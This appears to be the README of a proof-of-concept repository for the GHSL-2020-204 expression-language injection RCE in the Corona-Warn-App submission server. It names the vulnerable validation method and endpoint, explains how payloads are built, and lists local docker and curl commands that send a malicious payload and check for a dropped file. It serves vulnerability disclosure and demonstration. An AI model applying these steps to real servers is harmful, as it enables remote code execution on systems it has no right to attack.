# CWA submission-server GHSL-2020-204 poc

This is a simple poc for the bean validation framework RCE in the CWA-Server. General information about the security flaw in the bean validation framework can be found [here](https://securitylab.github.com/research/bean-validation-RCE/).

## Vulnerable bean validation in the submission server

The exploited method can be found [here](https://github.com/ci42/cwa-server-GHSL-2020-204-poc/blob/BeanValidationRCE/services/submission/src/main/java/app/coronawarn/server/services/submission/validation/ValidSubmissionPayload.java#L130). There are several other places in the `ValidSubmissionPayload` class where the bean validation framework flaw could be exploited. Look for `addViolation`usage with user supplied input.
The `ValidSubmissionPayload` class itself is used in the [`SubmissionController` class](https://github.com/ci42/cwa-server-GHSL-2020-204-poc/blob/BeanValidationRCE/services/submission/src/main/java/app/coronawarn/server/services/submission/controller/SubmissionController.java#L88), which is responsible for the vulnerable http endpoint under `version/v1/diagnosis-keys`.

## Payloads

Payloads must be in the protobuf format. They can be generated with the [SubmissionPayloadGenerator](https://github.com/ci42/cwa-server-GHSL-2020-204-poc/blob/BeanValidationRCE/services/submission/src/test/java/app/coronawarn/server/services/submission/SubmissionPayloadGenerator.java). Overwrite the `ORIGIN_COUNTRY` class field with arbitrary EL expressions. Various example expressions are included in the SubmissionPayloadGenerator source code.
Ready-made payloads can be found under `<repository-root>/services/submission/src/test/resources/payload`.

## Demonstrating the vulnerability

```
# start the CWA-server
$ docker-compose up

# optional: show logs of the vulnerable submission service (e.g. when showing the expression-language-payload)
$ docker-compose logs -f submission
# look for 'Origin country <the expression result> is not part of the supported countries list'

# call the submission-server with (malicious) payload
$ curl -v http://127.0.0.1:8000/version/v1/diagnosis-keys -H "cwa-fake: 0" -H "cwa-authorization: foo" -H "Content-Type: application/x-protob
uf" --data-binary @<path/to/payload>

# exec a shell the sumission container (when showing the file-dropping-payload)
$ docker exec -it <submission server containerID - find with 'docker ps'> /bin/bash
# in the container shell:
$ ls /tmp
$ cat /tmp/malicious
```
